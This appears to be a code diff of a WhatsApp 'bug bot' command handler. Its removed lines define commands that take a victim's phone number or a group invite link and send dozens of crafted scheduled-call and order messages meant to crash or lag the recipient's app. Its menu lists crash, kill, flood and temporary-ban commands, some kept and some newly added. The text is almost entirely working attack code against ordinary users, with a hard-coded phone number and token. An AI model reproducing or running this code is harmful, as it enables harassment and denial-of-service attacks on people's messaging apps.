-await sleep(3000)
-}
-replygcxeon(`*Successfully sent as many bugs as ${amount} Please pause for 3 minutes*`)
-}
-break
-case 'amountbug': {
-if (!isPremium) return replygcxeon(mess.prem)
-if (!args[0]) return replygcxeon(`Use ${prefix+command} amount\nExample ${prefix+command} 5`)
-amount = `${encodeURI(text)}`
-for (let i = 0; i < amount; i++) {
-const xeonybug1 = `${xeontext1}`
-var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
-"scheduledCallCreationMessage": {
-"callType": "2",
-"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
-"title": xeonybug1,
-}
-}), { userJid: from, quoted : m})
-XeonBotInc.relayMessage(from, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
-await sleep(3000)
-}
-}
-replygcxeon(`*Successfully sent as many bugs as ${amount} Please pause for 3 minutes*`)
-break
-case 'pmbug' :{
- if (!isPremium) return replygcxeon(mess.prem)
- if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 916909137213`)
- await loading()
-victim = text.split("|")[0]+'@s.whatsapp.net'
-amount = "30"
-for (let i = 0; i < amount; i++) {
-const xeonybug1 = `${xeontext1}`
-var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
-"scheduledCallCreationMessage": {
-"callType": "2",
-"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
-"title": xeonybug1,
-}
-}), { userJid: from, quoted : m})
-XeonBotInc.relayMessage(victim, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
-await sleep(3000)
-}
-}
-replygcxeon(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
-break
-case 'delaybug' : {
-if (!isPremium) return replygcxeon(mess.prem)
-if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 916909137213`)
-await loading()
-victim = text.split("|")[0]+'@s.whatsapp.net'
-amount = "30"
-for (let i = 0; i < amount; i++) {
-const xeonybug1 = xeontext2
-var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
-"scheduledCallCreationMessage": {
-"callType": "2",
-"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
-"title": xeonybug1,
-}
-}), { userJid: from, quoted : m})
-XeonBotInc.relayMessage(victim, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
-await sleep(3000)
-}
-}
-replygcxeon(`*Successfully Sent Bug To ${victim} Please pause for 3 minutes*`)
-break
-case 'docubug': {
-if (!isPremium) return replygcxeon(mess.prem)
-if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 916909137213`)
-await loading()
-if (args.length < 1) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 916909137213`)
-victim = text.split("|")[0]+'@s.whatsapp.net'
-amount = "15"
-for (let i = 0; i < amount; i++) {
-const xeonybug1 = `${xeontext1}`
-var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
-"scheduledCallCreationMessage": {
-"callType": "2",
-"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
-"title": xeonybug1,
-}
-}), { userJid: from, quoted : m})
-XeonBotInc.relayMessage(victim, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
-await sleep(3000)
-}
-}
-replygcxeon(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
-break
-case 'unlimitedbug' : {
-if (!isPremium) return replygcxeon(mess.prem)
-if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 916909137213`)
-await loading()
-victim = text.split("|")[0]+'@s.whatsapp.net'
-amount = "30"
-for (let i = 0; i < amount; i++) {
-const xeonybug1 = xeontext3
-var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
-"scheduledCallCreationMessage": {
-"callType": "2",
-"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
-"title": xeonybug1,
-}
-}), { userJid: from, quoted : m})
-XeonBotInc.relayMessage(victim, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
-await sleep(3000)
-}
-}
-replygcxeon(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
-break
-case 'bombug': {
-if (!isPremium) return replygcxeon(mess.prem)
-if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 916909137213`)
-await loading()
-victim = text.split("|")[0]+'@s.whatsapp.net'
-amount = "30"
-for (let i = 0; i < amount; i++) {
-const xeonybug1 = xeontext4
-var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
-"scheduledCallCreationMessage": {
-"callType": "2",
-"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
-"title": xeonybug1,
-}
-}), { userJid: from, quoted : m})
-XeonBotInc.relayMessage(victim, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
-await sleep(3000)
-}
-}
-replygcxeon(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
-break
-case 'lagbug' : {
-if (!isPremium) return replygcxeon(mess.prem)
-if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 916909137213`)
-await loading()
-victim = text.split("|")[0]+'@s.whatsapp.net'
-amount = "30"
-for (let i = 0; i < amount; i++) {
-const xeonybug1 = xeontext2
-var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
-"scheduledCallCreationMessage": {
-"callType": "2",
-"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
-"title": xeonybug1,
-}
-}), { userJid: from, quoted : m})
-XeonBotInc.relayMessage(victim, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
-await sleep(3000)
-}
-}
-replygcxeon(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
-break
-case 'trollybug': {
-if (!isPremium) return replygcxeon(mess.prem)
-if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 916909137213`)
-await loading()
-victim = text.split("|")[0]+'@s.whatsapp.net'
-amount = "15"
-for (let i = 0; i < amount; i++) {
-var order = generateWAMessageFromContent(from, proto.Message.fromObject({
-"orderMessage": {
-"orderId": "599519108102353",
-"thumbnail": thumb,
-"itemCount": 1999,
-"status": "INQUIRY",
-"surface": "CATALOG",
-"message": `${botname}`,
-"orderTitle": " TROLLY BUG ", 
-"sellerJid": "916909137213@s.whatsapp.net",
-"token": "AR6z9PAvHjs9Qa7AYgBUjSEvcnOcRWycFpwieIhaMKdrhQ=="
-}
-}), { userJid: from, quoted:m})
-XeonBotInc.relayMessage(victim, order.message, { messageId: order.key.id })
-}
-replygcxeon(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
-}
-break
-case 'gcbug' : {
-if (!isPremium) return replygcxeon(mess.prem)
- if (!args[0]) return replygcxeon(`Use ${prefix+command} link\nExample ${prefix+command} https://chat.whatsapp.com/JVKKTg3rmmiKEL3MQBVplg`)
-await loading()
-let result = args[0].split('https://chat.whatsapp.com/')[1]
-let xeongc = await XeonBotInc.groupAcceptInvite(result)
-amount = "30"
-for (let i = 0; i < amount; i++) {
-const xeonybug1 = `${xeontext1}`
-var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
-"scheduledCallCreationMessage": {
-"callType": "2",
-"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
-"title": xeonybug1,
-}
-}), { userJid: from, quoted : m})
-XeonBotInc.relayMessage(xeongc, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
-await sleep(3000)
-}
-replygcxeon(`*Successfully sent Bug To ${xeongc} Please pause for 3 minutes*`)
-}
-break
-case 'delaygcbug' :  {
-if (!isPremium) return replygcxeon(mess.prem)
-if (!args[0]) return replygcxeon(`Use ${prefix+command} link\nExample ${prefix+command} https://chat.whatsapp.com/JVKKTg3rmmiKEL3MQBVplg`)
-await loading()
-let result = args[0].split('https://chat.whatsapp.com/')[1]
-let xeongc = await XeonBotInc.groupAcceptInvite(result)
-amount = "30"
-for (let i = 0; i < amount; i++) {
-const xeonybug1 = xeontext5
-var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
-"scheduledCallCreationMessage": {
-"callType": "2",
-"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
-"title": xeonybug1,
-}
-}), { userJid: from, quoted : m})
-XeonBotInc.relayMessage(xeongc, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
-await sleep(3000)
-}
-replygcxeon(`*Successfully sent Bug To ${xeongc} Please pause for 3 minutes*`)
-}
-break
-case 'laggcbug' :  {
-if (!isPremium) return replygcxeon(mess.prem)
-if (!args[0]) return replygcxeon(`Use ${prefix+command} link\nExample ${prefix+command} https://chat.whatsapp.com/JVKKTg3rmmiKEL3MQBVplg`)
-await loading()
-let result = args[0].split('https://chat.whatsapp.com/')[1]
-let xeongc = await XeonBotInc.groupAcceptInvite(result)
-amount = "30"
-for (let i = 0; i < amount; i++) {
-const xeonybug1 = xeontext2
-var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
-"scheduledCallCreationMessage": {
-"callType": "2",
-"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
-"title": xeonybug1,
-}
-}), { userJid: from, quoted : m})
-XeonBotInc.relayMessage(xeongc, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
-await sleep(3000)
-}
-replygcxeon(`*Successfully sent Bug To ${xeongc} Please pause for 3 minutes*`)
-}
-break
-case 'bomgcbug' :  {
-if (!isPremium) return replygcxeon(mess.prem)
-if (!args[0]) return replygcxeon(`Use ${prefix+command} link\nExample ${prefix+command} https://chat.whatsapp.com/JVKKTg3rmmiKEL3MQBVplg`)
-await loading()
-let result = args[0].split('https://chat.whatsapp.com/')[1]
-let xeongc = await haikal.groupAcceptInvite(result)
-amount = "30"
-for (let i = 0; i < amount; i++) {
-const xeonybug1 = xeontext4
-var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
-"scheduledCallCreationMessage": {
-"callType": "2",
-"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
-"title": xeonybug1,
-}
-}), { userJid: from, quoted : m})
-XeonBotInc.relayMessage(xeongc, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
-await sleep(3000)
-}
-replygcxeon(`*Successfully sent Bug To ${xeongc} Please pause for 3 minutes*`)
-}
-break
-case 'unlimitedgcbug' :  {
-if (!isPremium) return replygcxeon(mess.prem)
-if (!args[0]) return replygcxeon(`Use ${prefix+command} link\nExample ${prefix+command} https://chat.whatsapp.com/JVKKTg3rmmiKEL3MQBVplg`)
-await loading()
-let result = args[0].split('https://chat.whatsapp.com/')[1]
-let xeongc = await XeonBotInc.groupAcceptInvite(result)
-amount = "30"
-for (let i = 0; i < amount; i++) {
-const xeonybug1 = xeontext3
-var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
-"scheduledCallCreationMessage": {
-"callType": "2",
-"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
-"title": xeonybug1,
-}
-}), { userJid: from, quoted : m})
-XeonBotInc.relayMessage(xeongc, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
-await sleep(3000)
-}
-replygcxeon(`*Successfully sent Bug To ${xeongc} Please pause for 3 minutes*`)
-}
-break
-case 'trollygcbug' :  {
-if (!isPremium) return replygcxeon(mess.prem)
-if (!args[0]) return replygcxeon(`Use ${prefix+command} link\nExample ${prefix+command} https://chat.whatsapp.com/JVKKTg3rmmiKEL3MQBVplg`)
-await loading()
-let result = args[0].split('https://chat.whatsapp.com/')[1]
-let xeongc = await XeonBotInc.groupAcceptInvite(result)
-amount = "15"
-for (let i = 0; i < amount; i++) {
-var order = generateWAMessageFromContent(from, proto.Message.fromObject({
-"orderMessage": {
-"orderId": "599519108102353",
-"thumbnail": thumb,
-"itemCount": 1999,
-"status": "INQUIRY",
-"surface": "CATALOG",
-"message": `${botname}`,
-"orderTitle": " TROLLY BUG ", 
-"sellerJid": "916909137213@s.whatsapp.net",
-"token": "AR6z9PAvHjs9Qa7AYgBUjSEvcnOcRWycFpwieIhaMKdrhQ=="
-}
-}), { userJid: from, quoted:m})
-XeonBotInc.relayMessage(xeongc, order.message, { messageId: order.key.id })
-}
-replygcxeon(`*Successfully sent Bug To ${xeongc} Please pause for 3 minutes*`)
-}
-break
-case 'docugcbug' :  {
-if (!isPremium) return replygcxeon(mess.prem)
-if (!args[0]) return replygcxeon(`Use ${prefix+command} link\nExample ${prefix+command} https://chat.whatsapp.com/JVKKTg3rmmiKEL3MQBVplg`)
-await loading()
-let result = args[0].split('https://chat.whatsapp.com/')[1]
-let xeongc = await XeonBotInc.groupAcceptInvite(result)
-amount = "15"
-for (let i = 0; i < amount; i++) {
-const xeonybug1 = `${xeontext1}`
-var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
-"scheduledCallCreationMessage": {
-"callType": "2",
-"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
-"title": xeonybug1,
-}
-}), { userJid: from, quoted : m})
-XeonBotInc.relayMessage(xeongc, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
-await sleep(3000)
-}
-replygcxeon(`*Successfully sent Bug To ${xeongc} Please pause for 3 minutes*`)
-} 
-break
+
             case 'menu':
                 let xeonmenuoh = `Hello ${pushname}
 ╰┈➤ ${xeonytimewisher} 😄
 ${readmore}
 ╰┈➤ʙᴜɢ ᴍᴇɴᴜ
-xreact <reply chat>
-x <number|amount>
-x2 <amount>
-iosbug <number|amount>
-iosbug2 <amount>
-xaudio <number|amount>
-xaudio2 <amount>
-xsticker <number|amount>
-xsticker2 <amount>
-xloc <number|amount>
-xloc2 <amount>
-xlist <number|amount>
-xlist2 <amount>
 xkill <number|amount>
 xkill2 <amount>
-xkillgc <link group>
 tempban <code|number>
 xcrash <number>
 infinite <number> 
 infinite-crash <number>
 ioscrash <number>
-kill-gc <gc-jid>
-flood-gc <gc-jid> infinite
-crash-gc <gc-jid> infinite-crash
 xioscrash <number>
-xioscrash2 <amount>
-iosgoogle <number>
-iosgoogle2 <amount>
-iosq <number>
+iosbug <number>
+kill-gc <gc-jid>
 
 ╰┈➤ ᴏᴡɴᴇʀ ᴍᴇɴᴜ
 getsession
